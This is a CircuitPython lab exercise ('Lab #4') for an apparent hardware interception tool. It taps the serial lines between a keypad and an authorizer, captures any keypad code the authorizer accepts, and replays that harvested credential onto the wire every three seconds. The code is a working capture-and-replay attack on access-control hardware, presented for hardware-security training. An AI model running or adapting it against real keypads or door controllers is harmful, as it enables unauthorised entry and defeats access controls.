import board, usb_cdc
from hecate import Hecate, Trigger


class CodeStorage:
    def __init__(self, capacity=5, terminators=b"\r\n"):
        self._terminators = terminators
        self._capacity = capacity
        self._buf = bytearray()
        self._pending = []
        self.captured = []

    def write(self, data):
        for byte in data:
            # step through each byte in the data we received
            self._buf.append(byte)
            if byte in self._terminators:
                # if the byte is a line terminator, it's a new message
                frame = bytes(self._buf)
                self._buf = bytearray()
                if any(b not in self._terminators for b in frame):
                    # if we got real data, then we need to add it to our list of possible codes
                    self._pending.append(frame)
                    if len(self._pending) > self._capacity:
                        self._pending = self._pending[-self._capacity:]

    def on_authorized(self, hecate, wire):
        if not self._pending:
            return
        code = self._pending[-1]
        self._pending = self._pending[:-1]
        if code not in self.captured:
            self.captured.append(code)
        hecate.mark_captured()


class CodeDeployer:
    def __init__(self, storage):
        self._storage = storage

    def deploy(self, hecate, wire):
        if self._storage.captured:
            wire.inject(self._storage.captured[-1])


h = Hecate(
    status_led=True,
    buffer=128,
    monitor=usb_cdc.data,
    uarts=[(board.TX, board.RX), (board.TX1, board.RX1)],
    logfile="hecate.log",
    errorfile="errors.log",
)

h.wire("from_authorizer", board.RX, board.TX1)
h.wire("from_keypad", board.RX1, board.TX)

storage = CodeStorage()
h.wires["from_keypad"].add_sink(storage)
h.wires["from_authorizer"].on_match(b"AUTHORIZED", callback=storage.on_authorized)

# -----
# Lab #4: Timers and Triggers
# We harvested a credential in Lab #3. Now let's deploy it automatically
# using a timer trigger that fires every 3 seconds.
#
# Watch the serial monitor: each injected payload is tagged with a *, so
# you can see the harvested credential being replayed onto the wire.
# -----

deployer = CodeDeployer(storage)
timer = Trigger(timer=3)
h.wires["from_keypad"].add_trigger(trigger=timer, callback=deployer.deploy)

h.run()
